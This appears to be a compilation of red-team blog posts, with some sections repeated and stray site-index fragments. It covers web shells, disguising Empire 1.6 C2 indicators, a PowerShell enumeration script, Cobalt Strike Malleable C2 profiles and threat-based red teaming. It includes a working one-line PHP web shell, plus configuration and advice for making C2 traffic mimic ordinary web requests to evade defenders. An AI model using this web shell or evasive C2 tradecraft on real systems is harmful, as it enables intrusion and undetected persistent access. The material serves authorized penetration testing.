If a web application is compromised, the webserver itself can be used to enable a command and control (C2) channel and provide a platform for post exploitation. The use of web shells is a common method to provide this capability. Like other malicious code, security protections must be considered and understood to bypass their protections. Specific Tools, tactics and procedures (TTPs) must be designed into a web shell to minimize detection. Many current web shells have no protection against common network security defenses. This post discusses the use of web shells for post exploitation and as a covert channel for use during penetration tests or red team engagements, how to minimize the risk of detection and the pros and cons of using web-shells. I developed two web shell frameworks \u2013 SubShell and TinyShell Before I discuss these web shells, here is a quick overview of a web shell. What is a web shell? \u00b6 Server side code that acts as a non-interactive 'shell', remote administration tool or control panel allowing a user to issue remote commands to be executed by a web server. Simply put, a web shell is a page that runs commands directly on the web server on behalf of the requestor. Why use a web shell? \u00b6 Web Applications can be a valuable door into a network and are often your first network foothold outside of social engineering Provides remote code execution into a network On demand. No regular polling or beaconing makes C2 harder to detect How do you use a web shell? \u00b6 Exploit or compromise a web server, i.e.: Application flaw File upload flaw RFI (remote file include) Direct access to application source Example \u00b6 Here is a simple PHP shell that uses the system function to execute OS commands. 1 <?php echo ( system ( $_GET [ \"q\" ])); ?> When an HTTP GET is sent to the URL hosting this page, the parameter \"q\" will be executed by the web server's OS. Subshell and Tiny Shell \u00b6 Why were these frameworks built? \u00b6 These projects were born out of the need for a consolidated webshell framework. There are numerous available, but I wanted to create a framework that supports numerous web languages, common features, and a common backend. These projects use the principle of hiding in plain sight with a goal of minimizing attention. Like numerous malicious tools, they are easy for defenders to find when they begin to look. These projects are designed to be stealthy by minimizing the triggering of defenses such as IDS, Firewall, AV etc. When performing penetration tests or red team engagements, \" hacking to get caught \" can be part of the test. Sometimes you want to be caught, sometimes you don't. A good security tester can control when or how their tools are exposed. How have I been caught? \u00b6 These are some mistakes or tools choices that allowed me to get caught by blue/defense teams. Most of the time this was caused by using untested tools that were not designed to be stealthy. Default User Agent strings OS commands in HTTP logs via GET requests Clear text OS commands moving across the wire Clear text binaries moving across the wire (MZ header) Doing too much too quick How does SubShell or Tinyshell help control getting caught? \u00b6 POST requests to minimize data written web logs Encoding and traffic blending to help avoid clear text detection Console interface forces a slow down when issuing commands. Use of a webshell should be deliberate and focused. Numerous connections may attract attention. Customization of user-agent to help blend in.

Empire 1.6's \u201cDefaultProfile\u201d setting for modifying C2 indicators doesn't directly allow modification of the server-side parameters. When faced with an experienced group of defenders, default C2 server indicators can quickly reveal your infrastructure. HTTPS listeners with valid certificates can certainly hinder traffic monitoring, but isn't a silver bullet. A good example of identifying Empire infrastructure is detailed in a Chokepoint post using Shodan and Scans.io scan data. They included a Python script that idenfitied an Empire server based on a cookie handling error, but the bug was fixed in a subsequent commit . This is just another reason to protect your infrastructure from probing using redirectors with Apache mod_rewrite as Jeff also explained . Nevertheless, the steps for identifying a default configured Empire server are fairly trivial and we wanted to be able to change them! We explored the ability to modify Empire 1.6 server side C2 indicators without breaking agent functionality. Server Parameters \u00b6 Staging URIs Default: index.asp,index.jsp,index.php Note How likely are asp, jsp, and php to exist together on the same web server? Payload staging is typically easy to identify no matter the C2 technology, but we can improve on Empire's default staging behavior. Empire \u2013 Default Staging URIs Server technology Default: Microsoft-IIS/7.5 Server content Default: \u201cIt works!\u201d Empire Modification \u00b6 We'll continue Jeff's original example by porting some of the additional server side parameters in the Bing Search Malleable C2 profile to Empire. Note The following modifications are applicable to Empire 1.6. Empire 2.0 utilizes Flask and some of these settings will need to be changed elsewhere if you're running 2.0 beta. Modifying the staging URIs and Server header \u00b6 The easiest way to update the server's default behavior is through the setup_database.py script. Disclaimer: These steps assume you're building up your server from scratch and aren't running an active engagement. You could also update the sqlite database directly if you don't want to blow away your existing database. First, remove your existing Empire database 1 rm /data/empire.db Next, edit /setup/setup_database.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # / setup / setup_database . py # the resource requested by the initial launcher # STAGE0_URI = \"index.asp\" STAGE0_URI = \"login\" # the resource used by the RSA key post # STAGE1_URI = \"index.jsp\" STAGE1_URI = \"home\" # the resource used by the sysinfo checkin that returns the agent . ps1 # STAGE2_URI = \"index.php\" STAGE2_URI = \"news\" # the default delay ( in seconds ) for agent callback # DEFAULT_DELAY = 5 DEFAULT_DELAY = 10 # the default jitter ( 0 . 0-1 . 0 ) to apply to the callback delay # DEFAULT_JITTER = 0 . 0 DEFAULT_JITTER = 0 . 5 # the default traffic profile to use for agent communications # format - > requestUris | user_agent | additionalHeaders # DEFAULT_PROFILE = \"/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\" DEFAULT_PROFILE = \"/search?q=news&go=Search&qs=bs&form=QBRE,/search?q=weather&go=Search&qs=bs&form=QBRE,/search?q=movie%20tickets&go=Search&qs=bs&form=QBRE,/search?q=unit%20conversion&go=Search&qs=bs&form=QBRE|Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8|Cookie:DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG\" # the server version to appear as # SERVER_VERSION = \"Microsoft-IIS/7.5\" SERVER_VERSION = \"Microsoft-IIS/8.5\" Finally, setup the new database and restart Empire 1 2 ./setup/setup_database.py ./empire Results \u00b6 Notice we now have new staging URI's that don't stick out quite as much and the new client communication profile is also in use.

When faced with an experienced group of defenders, default C2 server indicators can quickly reveal your infrastructure. HTTPS listeners with valid certificates can certainly hinder traffic monitoring, but isn't a silver bullet. A good example of identifying Empire infrastructure is detailed in a Chokepoint post using Shodan and Scans.io scan data. They included a Python script that idenfitied an Empire server based on a cookie handling error, but the bug was fixed in a subsequent commit . This is just another reason to protect your infrastructure from probing using redirectors with Apache mod_rewrite as Jeff also explained .

Every good pen-tester or red teamer has their list of go-to scripts, commands, or \"pasties\" to run once initial shell access is achieved. The goal is to quickly learn as much about your environment as possible; including defenses, system configuration, interesting files, and opportunities for persistence and lateral movement. Moreover, when working in large and/or distributed teams, a common tool-base and procedure set is crucial to ensure that necessary enumeration is accomplished no matter who's behind the keyboard. The first shell is often achieved on a host running the Microsoft Windows Operating System after a phishing/social-engineering attack or Web Application exploit. This makes PowerShell an excellent choice for automating post-exploitation and SA tasks. Invoke-HostEnum is a PowerShell 2.0 compatible enumeration script intended to be executed through a remote access capability such as Cobalt Strike's Beacon, Empire, or even a web-shell. All output is pre-formatted into Tables or Lists and converted to a string before returning results for this reason. Earlier internal versions of the script contained many more privilege escalation checks, but the continued development and robustness of PowerUp made these mostly redundant. There are several good examples of PowerShell host enumeration tools including HostRecon by Beau Bullock and Invoke-WinEnum in PowerShell Empire. Invoke-HostEnum borrows functions from these and other modules annotated throughout its source. There was a similarly named Invoke-HostEnum function in PowerView that was removed in 2015, but this is not a resurrected version. I've started to remove many (but not all) binary dependencies to avoid triggering potential alerts from running numerous common built-in Windows command-line enumeration tools in rapid succession.

By changing various defaults within the framework, an operator can modify the memory footprint of Beacon, change how often it checks in, and even what Beacon's network traffic looks like. All of these features are controlled by the Malleable C2 profile, which is chosen when starting the team server. The article makes the assumption that you understand the basics of malleable C2 and is intended to be used as reference for designing and creating malleable C2 profiles. The profile found at (https://github.com/threatexpress/malleable-c2 is to used as a reference profile. It is highly documented and contains tips and guidance to aide in creating new C2 profiles. If you are new to malleable C2, we recommend starting with this reference by Jeff Dimmock (@bluscreenofjeff) https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ or reading the other references. Big thanks to @andrewchiles and @001SPARTaN for helping test and develop this C2 profile!!! Don't use defaults. Use a profile. Modify sample profiles before use. It's likely that public Malleable C2 profiles are signatured by security products. Remember you're still generating \"beaconing\" network traffic that creates a detectable pattern that is mostly independent of the chosen profile Test, Test, Test The following are quick tips to consider when setting parameter values. Follow this to reduce troubleshooting errors. Enclose parameters in double quote, not single 1 2 set useragent \"SOME AGENT\"; # GOOD set useragent 'SOME AGENT'; # BAD Semicolons are ok prepend \"This is an example;\"; Escape Double quotes append \"here is \"some\" stuff\"; Escape Backslashes append \"more \\ stuff\"; Some special characters do not need escaping prepend \"!@#$%^&*()\"; The example profile used in the post can be found at https://github.com/threatexpress/malleable-c2 . This C2 profile is designed to mimic a jQuery request. This javascript framework is often used by many websites and may blend into a target's network. Consider your target when deciding on what a profile to emulate. C2 traffic should blend in with normal traffic. Network traffic from a C2 profile may bypass network sensors, but you want to tune to convince a defender that traffic is legitimate. Convincing a network analyst or security team that traffic is safe is a good technique to bypass security defenses and cause analysts to ignore alerts or mark them safe. We chose to use a jQuery request to blend in. This is a generic approach and may work against wide range of targets. Start from scratch or use a template? We recommend using an existing profile and develop your own template. The jQuery profile has been tuned and tweaked as a base profile we have used for a few years. It is often used as the starting point to build new profiles. The reference profile is self-documented, but let's walk through each section\u2026 Malleable C2 References The references and guidelines described below use the Malleable C2 profile found at https://github.com/threatexpress/malleable-c2 . Profile Name \u00b6 ![][4]Choose a profile name you would like to see in your reports. This does not affect Beacon's traffic or its footprint on target. Sleep Times \u00b6 These settings control the default time between Beacon check in (in milliseconds). A new HTTP/S beacon spawned using this C2 profile will check in using the sleep time as its callback interval, plus a random amount of time up to the specified by the jitter percentage. Choose a default time that will suit your operational needs, along with any OPSEC considerations. This example uses 60 seconds. This may be too aggressive for many engagements, and some defensive products may quickly detect beaconing behavior if it is too regular. User-Agent \u00b6 Use a User-Agent value that fits with your engagement. If possible, try to capture a real User-Agent string from the target organization, to blend in with real traffic. For example, consider sending a benign e-mail with a web bug to target organization members and monitor the User-Agents sent in subsequent GET requests. If you are using plaintext HTTP traffic, or if SSL interception is in place in the target environment, a User-Agent string that doesn't match the environment can provide an indicator for defenders. SSL Certificate \u00b6 This setting controls the SSL certificate used for HTTPS communications. If possible, utilize a real, properly-issued SSL certificate for the domain you're using. LetsEncrypt can issue free SSL certificates that are trusted by all major operating systems and browsers, and will make it harder for defenders to inspect Beacon traffic. SSL certificate store creation steps are well documented in Protect your C2 Server It is generally recommended to setup your target facing HTTPS certificates on redirector hosts. This limits the reconfiguration required on your teamserver in case a domain is burned during an operation. Caveat: Some CDN providers require your origin host to maintain a valid SSL certificate and your teamserver will need a trusted SSL certificate installed for Domain Fronting to function. Refer to the Cobalt Strike documentation https://www.cobaltstrike.com/help-malleable-c2#validssl or this post by @bluscreenofjeff https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ for instructions on configuring SSL with Cobalt Strike. SpawnTo Process \u00b6 The spawnto settings control what process a beacon will spawn for post-exploitation jobs, and when using the spawn command. This command can even use command line parameters set %windir%\\sysnative\\svchost.exe -k localservice -p -s fdPHost The additional parameters may help a Beacon blend in more if a defender looks at the command line of running processes. It can be difficult to find good candidate to use with spawnto. Experiment and test before selecting. General Guidelines: Don't use protected binaries. How do you know if they are protected? Test Don't select binaries that executes with UAC Choose a 64 bit binary for x64 payloads and 32-bit payload for x86 payloads Consider choosing a binary that would not look strange making network connections SMB Beacons \u00b6 SMB Beacons use named pipes to communicate through a parent Beacon. This allows for peer-to-peer communication between Beacons on the same host or across the network. The SMB Beacon's pipe names can be configured. Do not use default settings, as some defensive products will look for these defaults. Try to choose something that will blend in with the target environment. Follow this link: https://www.cobaltstrike.com/help-smb-beacon for more information on SMB Beacons. DNS Beacons \u00b6 DNS Beacons use DNS for all or part of their communications. Depending on the target environment's defensive technologies, DNS traffic can be easily detected, but is often a blind spot for defenders. DNS is best used as low and slow backup channel. Change the defaults to better fit your engagement. Follow this link https://www.cobaltstrike.com/help-dns-beacon for more information on DNS Beacons. Staging Process \u00b6 \u2026 truncated\u2026 The Beacon staging process can be customized. The staging process is the stub of code used to fully load a Beacon. Read this post https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/ to learn more about the Beacon staging process. Fortunately, the HTTP characteristics of the Beacon stager can be modified. Change these settings to mimic a single legitimate HTTP request/response. In this example the requests are sent to /jquery-3.3.1.slim.min.js or /jquery-3.3.2.slim.min.js , dependent on the target process architecture, to begin the staging process. The HTTP server parameters are built to mimic a jQuery request. The Beacon commands and payloads are blended in to a chunk of the jQuery javascript text. The client makes a request that is reasonable when requesting jQuery from content delivery network. Many websites do this with http://www.google-analytics.com/ga.js \"> src=\"jquery-3.3.1.min.js\"> . The URIs can be modified to look like other CDNs. For example, you could modify the http-stager to look as if it is pulling from the Microsoft jQuery CDN. https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js In some cases, it may be better to use stageless payloads, as the staging process is an indicator that defensive products can alert on. Memory Indicators \u00b6 Some of the newest Malleable C2 features enable modification of many Beacon memory indicators. This topic can get quite deep and deserves it own blog post. Refer to https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/ and https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK for details on controlling Beacon memory indicators. This example uses the peclone tool to rip the memory metadata from explorer.exe, save as part of the Beacon payload, and uses several of the recommendations from Raphael's \"In Memory Evasion\" blogpost. HTTP GET \u00b6 \u2026 truncated\u2026 Like the http-stager section, the HTTP GET requests/responses can be modified. This section is used to check a teamserver for tasks. More information can be found here https://www.cobaltstrike.com/help-http-beacon . This profile uses a similar format found in the http-stager. The difference is the use of the cookie __cfduid= . This value contains information about the Beacon and is used by the teamserver to issue tasks. The teamserver responds with a task hidden in the jQuery javascript text. Modify this section to match the HTTP traffic you would like to use. If you choose to use a GET-only profile (see below), this is also how Beacon transmits information back to the teamserver. Note The set uri option can accept multiple URIs. This can be used to add diversity to your requests. However, Beacons will not perform requests in a round robin style as you might assume and instead a single URI from the list will be assigned to each Beacon during staging. HTTP POST \u00b6 Like the http-stager and http-get sections, the HTTP-POST requests/responses can be modified. The HTTP-POST section serves as Beacon's response to commands issued by the server and can actually be performed as a HTTP GET or HTTP POST request. This example uses an HTTP POST as shown with set verb \"POST\"; The HTTP traffic follows the same style of the HTTP-GET section and mimics a jQuery request. You can change the mode from HTTP-POST to HTTP-GET by commenting out the POST section and uncommenting the GET section of HTTP-POST. GET-Only Profiles have Trade-offs GET-Only profiles have some trade-offs and may leave you scratching your head when attempting to pull large amounts of data (i.e. download a file or take a screenshot). This is due to the way data is transmitted within the URI, URI parameters, or Headers. This side-effect is well documented by Raphael at It is important to always validate and test Malleable C2 profiles before using them on a target. A malformed profile can easily cause Beacons to fail to check in, or to not send output from tasks. Always test new C2 profiles before utilizing them in a real-world situation.

By changing various defaults within the framework, an operator can modify the memory footprint of Beacon, change how often it checks in, and even what Beacon's network traffic looks like. All of these features are controlled by the Malleable C2 profile, which is chosen when starting the team server. The article makes the assumption that you understand the basics of malleable C2 and is intended to be used as reference for designing and creating malleable C2 profiles. The profile found at (https://github.com/threatexpress/malleable-c2 is to used as a reference profile. It is highly documented and contains tips and guidance to aide in creating new C2 profiles. If you are new to malleable C2, we recommend starting with this reference by Jeff Dimmock (@bluscreenofjeff) https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ or reading the other references. Big thanks to @andrewchiles and @001SPARTaN for helping test and develop this C2 profile!!! Don't use defaults. Use a profile. Modify sample profiles before use. It's likely that public Malleable C2 profiles are signatured by security products. Remember you're still generating \"beaconing\" network traffic that creates a detectable pattern that is mostly independent of the chosen profile Test, Test, Test The following are quick tips to consider when setting parameter values. Follow this to reduce troubleshooting errors. Enclose parameters in double quote, not single 1 2 set useragent \"SOME AGENT\"; # GOOD set useragent 'SOME AGENT'; # BAD Semicolons are ok prepend \"This is an example;\"; Escape Double quotes append \"here is \"some\" stuff\"; Escape Backslashes append \"more \\ stuff\"; Some special characters do not need escaping prepend \"!@#$%^&*()\"; The example profile used in the post can be found at https://github.com/threatexpress/malleable-c2 . This C2 profile is designed to mimic a jQuery request. This javascript framework is often used by many websites and may blend into a target's network. Consider your target when deciding on what a profile to emulate. C2 traffic should blend in with normal traffic. Network traffic from a C2 profile may bypass network sensors, but you want to tune to convince a defender that traffic is legitimate. Convincing a network analyst or security team that traffic is safe is a good technique to bypass security defenses and cause analysts to ignore alerts or mark them safe. We chose to use a jQuery request to blend in. This is a generic approach and may work against wide range of targets. Start from scratch or use a template? We recommend using an existing profile and develop your own template. The jQuery profile has been tuned and tweaked as a base profile we have used for a few years. It is often used as the starting point to build new profiles. The reference profile is self-documented, but let's walk through each section\u2026 Malleable C2 References The references and guidelines described below use the Malleable C2 profile found at https://github.com/threatexpress/malleable-c2 .","title":"A Deep Dive into Cobalt Strike Malleable C2"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#profile-name","text":"![][4]Choose a profile name you would like to see in your reports.

LetsEncrypt can issue free SSL certificates that are trusted by all major operating systems and browsers, and will make it harder for defenders to inspect Beacon traffic. SSL certificate store creation steps are well documented in Protect your C2 Server It is generally recommended to setup your target facing HTTPS certificates on redirector hosts. This limits the reconfiguration required on your teamserver in case a domain is burned during an operation. Caveat: Some CDN providers require your origin host to maintain a valid SSL certificate and your teamserver will need a trusted SSL certificate installed for Domain Fronting to function.

The staging process is the stub of code used to fully load a Beacon. Read this post https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/ to learn more about the Beacon staging process. Fortunately, the HTTP characteristics of the Beacon stager can be modified. Change these settings to mimic a single legitimate HTTP request/response. In this example the requests are sent to /jquery-3.3.1.slim.min.js or /jquery-3.3.2.slim.min.js , dependent on the target process architecture, to begin the staging process. The HTTP server parameters are built to mimic a jQuery request. The Beacon commands and payloads are blended in to a chunk of the jQuery javascript text. The client makes a request that is reasonable when requesting jQuery from content delivery network. Many websites do this with http://www.google-analytics.com/ga.js \"> src=\"jquery-3.3.1.min.js\"> . The URIs can be modified to look like other CDNs. For example, you could modify the http-stager to look as if it is pulling from the Microsoft jQuery CDN. https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js In some cases, it may be better to use stageless payloads, as the staging process is an indicator that defensive products can alert on.","title":"Staging Process"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#memory-indicators","text":"Some of the newest Malleable C2 features enable modification of many Beacon memory indicators.

This section is used to check a teamserver for tasks. More information can be found here https://www.cobaltstrike.com/help-http-beacon . This profile uses a similar format found in the http-stager. The difference is the use of the cookie __cfduid= . This value contains information about the Beacon and is used by the teamserver to issue tasks. The teamserver responds with a task hidden in the jQuery javascript text. Modify this section to match the HTTP traffic you would like to use. If you choose to use a GET-only profile (see below), this is also how Beacon transmits information back to the teamserver. Note The set uri option can accept multiple URIs. This can be used to add diversity to your requests. However, Beacons will not perform requests in a round robin style as you might assume and instead a single URI from the list will be assigned to each Beacon during staging.","title":"HTTP GET"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#http-post","text":"Like the http-stager and http-get sections, the HTTP-POST requests/responses can be modified. The HTTP-POST section serves as Beacon's response to commands issued by the server and can actually be performed as a HTTP GET or HTTP POST request. This example uses an HTTP POST as shown with set verb \"POST\"; The HTTP traffic follows the same style of the HTTP-GET section and mimics a jQuery request. You can change the mode from HTTP-POST to HTTP-GET by commenting out the POST section and uncommenting the GET section of HTTP-POST. GET-Only Profiles have Trade-offs GET-Only profiles have some trade-offs and may leave you scratching your head when attempting to pull large amounts of data (i.e. download a file or take a screenshot). This is due to the way data is transmitted within the URI, URI parameters, or Headers. This side-effect is well documented by Raphael at It is important to always validate and test Malleable C2 profiles before using them on a target. A malformed profile can easily cause Beacons to fail to check in, or to not send output from tasks.

An organization's security design is influenced and pressured from multiple, often competing, sources. This includes customers, compliance, management, peers, budget, public opinion, and news. This process is complex and challenging, but an organization is generally able to overcome the pressures and implement what is considered to be a robust security program. An organization is able to please the various parties and, at least on paper, describe a strong security program designed to stop malicious cyber-attacks. Audit and compliance checks pass with a green light. Robust patch management systems are deployed. Vulnerability assessments and penetration tests are conducted. In general, the organization has good security hygiene. These are all great steps in defending a network from attack, but unfortunately, often fall short in achieving the primary goal of preventing, detecting, and responding to real threats. Why? What is missing? The real question to consider is: Are organizations really building security programs designed to address the threat? This post dives into the shortcomings of security operations design, implementation, and testing and how applying a threat-based security testing program can reduce these gaps to ultimately improve the state of security. A security program includes many components; staff, policy, tools, management, oversight, incident response to name a few. The program is built by including members of several different divisions. Each contribute their security requirements to ultimately design and build the program. This is a great, but what, or better who, is often missing from this strategy? Has anyone on the team ever seen a bad guy? Is the threat really included in security planning? \u00b6 Good intentions by a group of intelligent people do not add up to understanding threats or how they operate. If the goal of security operations is to prevent, detect, respond, and recover to malicious actions, it only makes sense to include the opinions of those who you are defending against. Unfortunately, the threat or threat perspective is often excluded from security design. This omission can lead to the mitigation or acceptance of risks not fully understood or revealed from traditional security testing and auditing. This can lead to a serious false sense of security. A real threat knows this and uses it to their advantage. Consider the following. Does a threat know a target has a robust security program? Do threats perform actions that will trigger an alert or get them caught? Are threats still successful? If so, why are threats able to successfully achieve their goals and negatively impact an organization that has a comprehensive security program? To understand this, we need to know what we are defending against. The security industry uses the term threat, but... What is a threat? \u00b6 Dictionary.com 1 defines threat as: a declaration of an intention or determination to inflict punishment, injury, etc., in retaliation for, or conditionally upon, some action or course; menace an indication or warning of probable trouble a person or thing that threatens. ISO 27001 2 defines threat as: A potential cause of an incident, that may result in harm of systems and organization NIST 3 defines threat as: Any circumstance or event with the potential to adversely impact organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an information system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service. | To summarize and keep this in context of cybersecurity, a threat is an event that has the potential to adversely impact an organization. Is this what security operations is defending against? A negative event? Perhaps, but consider including the term threat-actor when using threat. A threat-actor is the person or group of people behind an attack. A solid defensive strategy must defend against the intelligent threat-actor bent on causing damage to an organization, and not just a potential event. People are behind cyber-attacks. When the defense considers the tactics, techniques, and procedures (TTPs) of intelligent threat-actors, they begin to truly understand the real threat. Defenders can then implement security defenses that directly impact the ability a threat-actor has to perform negative actions. Shifting security operations from the mindset of \"Vulnerable\" or \"Not Vulnerable\" and adopting an approach that focuses on threat actions will significantly improve the ability an organization has to not only prevent but also detect and respond to real threats. This is the beginning of understanding security through the eyes of the threat. Organizations who use threat actions to drive their defensive TTPs can make life very difficult for threat-actors and even protect themselves against unknown or zero-day attacks. Why do Threats Succeed? \u00b6 Many organization's currently use audit and compliance, vulnerability assessments, and penetration testing to evaluate and measure risk to cyber-attack. Why bother with a new threat focused approach? Isn't the identification and mitigation of vulnerabilities enough? \u00b6 In order to answer, you must understand how a threat-actor thinks and acts. Remember, a threat is really an intelligent person bent on causing harm. It is NOT an exploit of a vulnerability, NOT a piece of malware, or NOT a phishing attack. These are merely means a threat-actor may choose to use to achieve their end goal. The threat-actor knows the target has a comprehensive security program. A suite of security tools (firewalls, intrusion detection systems, anti-virus, EDR, etc) are deployed with the intent of stopping cyber-attacks. A good threat-actor knows this and will most likely assume patches are deployed and vulnerability assessments and penetration tests are performed. This understanding can significantly change the actions taken by a threat-actor compared to the actions taken by a traditional security tester. Does the threat-actor fire up a port scanner and enumerate an entire network? Does a threat-actor fire up vulnerability scanning tool to find an exploit? Attacks by threat-actors do not always follow the models adopted by traditional security testing. An attack is not scan -> exploit -> profit. An intelligent threat-actor evaluates what a target presents and uses weakness not always discovered through traditional security tests. The threat-actor will take a number of controlled steps to gain access to a target, establish command and control, establish persistence, and ultimately achieve their desired goal. The people charged with defending an organization often ignore or misunderstand the steps taken by a threat-actor. This often leads to focus on prevention, not detection. Defenders who do focus on detection may drown themselves in un-actionable default or vendor generate logs and alerts. Have you ever heard from the defending team \"We have too many logs and alerts to respond!\"? Why do organizations log what they log? Compliance? In case they are needed? Vendor advice? Organizations are still missing a key piece to all threats; understanding their actions and TTPs. Consider this scenario \u00b6 After evaluating a target network, a threat-actor decides phishing is their chosen method to gain access. A phish is sent to a small number of people. The phish contains an excel attachment with a DDE 4 based attack. An email recipient opens the attachment, malicious code is executed on the target, and command and control (C2) is established. The threat-actor then performs a series of steps that includes situational awareness of current access, enumeration of potential new targets, and lateral movement options to those targets. In this case, the threat finds clear text database credentials on a old test web application backup in a public share. The credentials are used to laterally move to a test database server. Code execution on the database server provides elevated access. The situational awareness cycle repeats. The threat-actor discovers elevated credentials stored in memory on the database server. Credential material is extracted from a Windows domain controller using the stolen elevated database credentials. The threat-actor performs additional situational awareness and enumeration using the new credentials from the domain controller. The intended target is identified and is located on a sensitive file repository. Using the elevated access and C2 channels, the threat-actor achieves their final objective and exfiltrates sensitive data outside the network. Is this scenario reasonable? Were opportunities presented to detect or prevent the threat? Organizations often blame the end user who clicked the link. What about the actions taken after the initial click? This scenario indicates an organization's entire security model may depend on users not clicking a link in an email. The organization does not intend to hinge all security on a single user, but the actions taken to defend their systems often say otherwise. Why is this scenario successful? \u00b6 Organizations often have the wrong mindset to security defense Users are blamed for clicking links Policies, procedures, and compliance measure security Log everything (You never know what you need) Patch, patch, patch. Threats only use exploits Our security tools will save use These can be valuable actions that reduce the attack surface, but an intelligent threat-actor knows this. Instead of only focusing on actions that impact the attack surface, organizations need to include a focus on threat TTPs. This does not mean focusing on a specific threat-actor. Whether the threat-actor is script kiddie or an APT, both will execute a series of steps (TTPs) to impact an organization. This is the key. Focusing on defending against TTPs combined with good security practices that reduce the attack surface is the most effective way to directly impact a threat-actor's ability to operate. A Threat Will\u2026 \u00b6 To keep it simple, a threat-actor must Get-In to establish an initial foothold. This phase is generally quick, but defenders place heavy focus here. They must Stay-In by establishing command and control (C2). This is the phase where the threat maintains influence over the target. Actions may include persistence, target identification, lateral movement, and privilege escalation. The Stay-In phase provides the most opportunity to detect or impact a threat, but is often ignored or misunderstood. Finally, the threat-actor will Act or perform the actions that reflect why they attacked if the first place. Keeping security simple can help defenders be focused an apply an intelligent defense strategy instead of defending everything at once. A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition of Red Teaming Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. In other words, red teaming is the process of emulating a threat using real threat techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT . Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessment are good at reducing the attack surface but do not provide much detail in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target's attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat's ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization's operations or how security operations was able to impact a threat's ability to operate. PDRR (Protect, Detect, Respond, Recover) Coverage \u00b6 The NIST CyberSecurity Framework 6 has guidance for improving critical infrastructure cybersecurity. According to NIST: The Framework provides a common taxonomy and mechanism for organizations to: Describe their current cybersecurity posture; Describe their target state for cybersecurity; Identify and prioritize opportunities for improvement within the context of a continuous and repeatable process; Assess progress toward the target state; Communicate among internal and external stakeholders about cybersecurity risk. The core of the framework presents industry standards, guidelines, and practices in a manner that allows for communication of cybersecurity activities and outcomes across an organization from the executive level to the operations level. The core consists of five functions\u2014Identify, Protect, Detect, Respond, Recover. The functions provide a high-level, strategic view of an organization's management of cybersecurity risk. The framework then identifies underlying key categories and subcategories for each function, and matches them with example informative references, such as existing standards, guidelines, and practices for each subcategory. For more details, visit https://www.nist.gov/cyberframework/cybersecurity-framework-faqs-framework-components . What does this mean for Red Teaming? Let's focus on how red teaming can be used by an organization to measure its ability to Protect , Detect , Respond , and Recover against a threat. Protect \u2013 The Protect function supports the ability to limit or contain the impact of a potential cybersecurity event. Detect \u2013 The Detect function enables the timely discovery of cybersecurity events. Respond \u2013 The Respond function supports the ability to contain the impact of a potential cybersecurity incident. Recover \u2013 The Recover function supports timely recovery to normal operations to reduce the impact from a cybersecurity incident. Red teaming allows an organization to explore a wide range of threat activity. This provides the stimulation required to engage security operations as a whole. Red teaming engages an organization's security operations (Blue Team) and exercises Blue TTPs through protection, detection, response, and recovery from a threat. Vulnerability assessments and penetration testing are generally more limited and typically only engage protection and some detection. The following illustrates the PDRR coverage of different assessment types. \u00b6 When an organization is ready to understand the negative impacts caused by a threat-actor, a professional red team is used to provide the required threat emulation and stimulus. A professional red team has the ability to emulate a threat-actors TTPs in order to stimulate and engage security defenders against a realistic threat. Red teams may identify vulnerabilities and exploits, but these are only a means to an end. Red teams focus on engagement goals. This engages an organization with a realistic attack to better understand how they are able to impact a threat's ability to operate or cause negative impacts to the organization. Red teams can emulate realistic TTPs through research and experience. Much of this information has been complied in to a framework (ATT&CK) and organizations can use this to help measure their ability to defend against specific TTPs. MITRE's Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK\u2122) 7 is a knowledge base and model for cyber threat behavior. ATT&CK is useful for understanding security risk against known threat behavior, for planning security improvements, and verifying defenses work as expected. 